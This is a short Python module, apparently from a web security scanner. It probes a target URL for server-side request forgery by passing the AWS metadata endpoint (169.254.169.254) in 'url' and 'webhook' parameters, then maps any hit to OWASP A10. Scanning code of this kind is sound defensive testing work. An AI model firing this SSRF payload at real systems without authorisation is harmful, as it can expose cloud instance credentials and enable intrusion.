import httpx
from classifiers.owasp_mapper import OWASPMapper

def probe_ssrf(url):
    findings = []
    # Probe AWS metadata endpoint
    ssrf_payload = "http://169.254.169.254/latest/meta-data/"
    
    try:
        with httpx.Client(timeout=5) as client:
            # We test appending it to URL parameters
            res = client.get(url, params={"url": ssrf_payload, "webhook": ssrf_payload})
            
            if "ami-id" in res.text or "instance-id" in res.text:
                findings.append(OWASPMapper.map_finding(
                    'A10',
                    'Server-Side Request Forgery (SSRF)',
                    'The server fetched and returned the AWS metadata endpoint.',
                    f'Payload: {ssrf_payload}'
                ))
    except Exception:
        pass

    return findings
